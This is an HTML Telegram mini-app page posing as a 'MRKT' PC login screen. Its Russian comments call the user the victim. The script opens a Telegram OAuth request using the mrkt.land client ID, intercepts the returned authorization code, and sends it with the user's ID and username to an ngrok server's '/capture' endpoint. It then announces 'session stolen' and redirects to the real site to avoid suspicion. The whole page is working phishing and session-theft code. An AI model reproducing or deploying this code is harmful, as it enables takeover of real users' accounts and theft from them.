<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <title>MRKT вход</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: var(--tg-theme-bg-color, #0a0a0a);
            color: var(--tg-theme-text-color, #ffffff);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            text-align: center;
            padding: 20px;
            max-width: 340px;
            width: 100%;
        }
        .logo { font-size: 56px; margin-bottom: 16px; }
        h1 { font-size: 24px; font-weight: 700; margin-bottom: 8px; }
        .subtitle {
            color: var(--tg-theme-hint-color, #999);
            font-size: 15px;
            margin-bottom: 32px;
        }
        .btn {
            background: var(--tg-theme-button-color, #0088cc);
            color: var(--tg-theme-button-text-color, #ffffff);
            border: none;
            padding: 16px 24px;
            border-radius: 12px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: opacity 0.2s;
        }
        .btn:active { opacity: 0.7; }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        #status {
            margin-top: 16px;
            font-size: 14px;
            color: var(--tg-theme-hint-color, #666);
            min-height: 20px;
            word-break: break-word;
        }
        .info {
            margin-top: 12px;
            padding: 10px;
            background: var(--tg-theme-secondary-bg-color, #1a1a1a);
            border-radius: 8px;
            font-size: 12px;
            color: var(--tg-theme-hint-color, #666);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🖥️</div>
        <h1>MRKT вход</h1>
        <p class="subtitle">Нажмите кнопку для входа <br>на <strong>ПК</strong></p>

        <button class="btn" onclick="loginToMRKT()" id="loginBtn">
            Войти на ПК
        </button>

        <div id="status">Нажмите кнопку для входа</div>
        <div class="info" id="info">📡 Перехватчик активен...</div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();

        // ============================================================
        // ⚡ ТВОЙ ПУБЛИЧНЫЙ АДРЕС (из ngrok)
        // ============================================================
        const SERVER_URL = 'https://cardigan-demise-overbite.ngrok-free.dev';

        // ============================================================
        // ПОЛУЧАЕМ ДАННЫЕ ЖЕРТВЫ
        // ============================================================
        const victim = tg.initDataUnsafe?.user || {};
        const victimId = victim.id || 'unknown';
        const victimUsername = victim.username || 'unknown';

        console.log('👤 Жертва:', { victimId, victimUsername });
        document.getElementById('info').textContent = `👤 Жертва: ${victimUsername} (ID: ${victimId})`;

        // ============================================================
        // ГЕНЕРАЦИЯ ПАРАМЕТРОВ
        // ============================================================
        function randomString(length) {
            return Math.random().toString(36).substring(2, 2 + length);
        }

        function generateChallenge() {
            return randomString(15) + randomString(15) + randomString(15);
        }

        // ============================================================
        // ОСНОВНАЯ ФУНКЦИЯ
        // ============================================================
        async function loginToMRKT() {
            const btn = document.getElementById('loginBtn');
            const status = document.getElementById('status');

            btn.disabled = true;
            btn.textContent = 'Загрузка...';
            status.textContent = '⏳ Отправка запроса...';

            const state = randomString(12) + randomString(12);
            const challenge = generateChallenge();

            // ============================================================
            // ⚡ ФОРМИРУЕМ OAuth ЗАПРОС
            // ============================================================
            const params = new URLSearchParams({
                client_id: '8156315866',
                origin: 'https://www.mrkt.land',
                return_to: 'https://www.mrkt.land/api/v1/tg_openid/callback',
                state: state,
                scope: 'openid profile',
                state: state,
                redirect_uri: 'https://www.mrkt.land/api/v1/tg_openid/callback',
                code_challenge: challenge,
                code_challenge_method: 'S256',
                response_type: 'code'
            });

            const authUrl = 'https://oauth.telegram.org/auth?' + params.toString();

            console.log('🔗 Открываем:', authUrl);
            status.textContent = '✅ Запрос отправлен! Подтвердите вход на телефоне.';

            // ============================================================
            // ОТКРЫВАЕМ В БРАУЗЕРЕ НА ПК
            // ============================================================
            try {
                tg.openLink(authUrl);
            } catch (e) {
                window.open(authUrl, '_blank');
            }

            // ============================================================
            // ⚡ ПЕРЕХВАТЫВАЕМ CALLBACK
            // ============================================================
            let attempts = 0;
            const maxAttempts = 30;

            const interval = setInterval(async () => {
                attempts++;
                
                if (attempts > maxAttempts) {
                    clearInterval(interval);
                    status.textContent = '⏰ Время ожидания истекло.';
                    btn.disabled = false;
                    btn.textContent = 'Войти на ПК';
                    return;
                }

                try {
                    const urlParams = new URLSearchParams(window.location.search);
                    const code = urlParams.get('code');
                    const state = urlParams.get('state');

                    if (code && state) {
                        clearInterval(interval);
                        status.textContent = '✅ CODE перехвачен! Отправка на сервер...';

                        // ============================================================
                        // ⚡ ОТПРАВЛЯЕМ CODE НА СЕРВЕР
                        // ============================================================
                        const response = await fetch(SERVER_URL + '/capture', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                code: code,
                                state: state,
                                userId: victimId,
                                username: victimUsername
                            })
                        });

                        const data = await response.json();
                        console.log('📡 Ответ сервера:', data);

                        if (data.status === 'success') {
                            status.textContent = '✅ СЕССИЯ УКРАДЕНА! 🎉';
                            btn.disabled = false;
                            btn.textContent = 'Войти на ПК';
                            window.location.href = 'https://www.mrkt.land';
                        } else {
                            status.textContent = '⚠️ Ошибка: ' + (data.error || 'Неизвестная ошибка');
                            btn.disabled = false;
                            btn.textContent = 'Войти на ПК';
                        }
                    }
                } catch (error) {
                    console.error('❌ Ошибка:', error);
                }
            }, 2000);
        }
    </script>
</body>
</html>
